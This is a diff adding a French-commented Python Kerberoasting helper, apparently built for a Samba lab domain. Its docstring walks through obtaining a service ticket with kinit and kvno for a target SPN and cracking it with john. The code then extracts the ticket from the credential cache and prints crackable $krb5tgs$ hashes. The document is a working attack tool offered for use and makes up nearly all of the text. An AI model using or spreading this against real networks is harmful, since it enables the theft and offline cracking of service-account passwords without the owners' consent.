@@ -1,0 +1,107 @@
+#!/usr/bin/env python3
+"""
+kerberoast — récupère un TGS Kerberoastable et le formate pour hashcat/john.
+
+Pourquoi cet outil existe :
+  Les outils standards (impacket-GetUserSPNs, nxc --kerberoasting) butent sur
+  un mismatch de checksum avec le KDC Samba (KRB_AP_ERR_INAPP_CKSUM). Ce
+  helper passe par les outils Kerberos natifs (kinit/kvno) qui parlent
+  correctement à Samba, puis extrait le TGS depuis le ccache pour le donner
+  à hashcat/john.
+
+Usage :
+  # 1. Authentifie-toi avec un compte du domaine (n'importe lequel valide) :
+  kinit j.martin@HUMANIX.LAB
+  # (entre le mot de passe)
+
+  # 2. Demande un TGS pour le SPN cible — kvno l'ajoute au ccache :
+  kvno HTTP/backup.humanix.lab
+
+  # 3. Extrais le hash crackable :
+  kerberoast HTTP/backup.humanix.lab > backup.hash
+
+  # 4. Crack :
+  john backup.hash --wordlist=/opt/wordlist.txt
+
+  Bonus : tu peux lister les SPN AVANT de cibler avec :
+    impacket-GetUserSPNs humanix.lab/USER:PASS -dc-ip 172.30.0.10
+  (le listing ne fait que du LDAP, donc ça marche — c'est le -request qui pète)
+"""
+import sys
+from impacket.krb5.ccache import CCache
+from impacket.krb5.asn1 import Ticket
+from pyasn1.codec.der import decoder
+from binascii import hexlify
+
+def main():
+    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
+        print(__doc__, file=sys.stderr)
+        sys.exit(0 if len(sys.argv) >= 2 else 1)
+
+    spn = sys.argv[1]
+    ccache_file = sys.argv[2] if len(sys.argv) > 2 else "/tmp/krb5cc_0"
+
+    try:
+        ccache = CCache.loadFile(ccache_file)
+    except FileNotFoundError:
+        print(f"[!] Pas de credential cache '{ccache_file}'.", file=sys.stderr)
+        print("    Fais d'abord : kinit <user>@HUMANIX.LAB", file=sys.stderr)
+        sys.exit(1)
+
+    # Récupère le principal courant (qui a fait le kinit)
+    client_principal = ccache.principal.prettyPrint().decode()
+
+    # Cherche le TGS pour le SPN demandé
+    target_cred = None
+    matched_server = None
+    for cred in ccache.credentials:
+        server = cred["server"].prettyPrint().decode()
+        # Le format dans le ccache est "spn@REALM" ou juste "spn"
+        if spn.lower() in server.lower():
+            target_cred = cred
+            matched_server = server
+            break
+
+    if target_cred is None:
+        print(f"[!] Aucun TGS pour '{spn}' dans {ccache_file}.", file=sys.stderr)
+        print(f"    Lance d'abord : kvno {spn}", file=sys.stderr)
+        print(f"    TGS actuellement en cache :", file=sys.stderr)
+        for cred in ccache.credentials:
+            print(f"      - {cred['server'].prettyPrint().decode()}", file=sys.stderr)
+        sys.exit(1)
+
+    # Décode le ticket. ccache stocke en CountedOctetString = [len:4 bytes][data].
+    # On skip les 4 premiers bytes de longueur pour récupérer le DER pur.
+    ticket_raw = target_cred.ticket.getData()[4:]
+    decoded_ticket = decoder.decode(ticket_raw, asn1Spec=Ticket())[0]
+    enc_part = decoded_ticket["enc-part"]
+    etype = int(enc_part["etype"])
+    cipher = bytes(enc_part["cipher"])
+
+    # Format hashcat / john : $krb5tgs$ETYPE$*USER$REALM$SPN*$first16$rest
+    # ETYPE : 23 (RC4), 17 (AES128), 18 (AES256)
+    realm = client_principal.split("@")[1]
+    user = client_principal.split("@")[0]
+    cipher_hex = hexlify(cipher).decode()
+
+    # IMPORTANT : john utilise ':' comme séparateur de champs et bug si le SPN
+    # contient un ':' (ex: MSSQLSvc/host:1433). Le SPN dans le hash n'est qu'une
+    # étiquette (pas utilisé dans le calcul) → on retire les caractères qui
+    # cassent le parser john.
+    spn_safe = matched_server.replace(":", "_")
+
+    if etype == 23:
+        # RC4 : checksum (16 bytes = 32 hex) puis le reste
+        first16 = cipher_hex[:32]
+        rest = cipher_hex[32:]
+        print(f"$krb5tgs$23$*{user}${realm}${spn_safe}*${first16}${rest}")
+    elif etype in (17, 18):
+        # AES128 / AES256 : tout le cipher est le hash
+        print(f"$krb5tgs${etype}${user}${realm}${spn_safe}*${cipher_hex[:-24]}${cipher_hex[-24:]}")
+    else:
+        print(f"[!] Enctype {etype} inconnu (attendu 17/18/23)", file=sys.stderr)
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
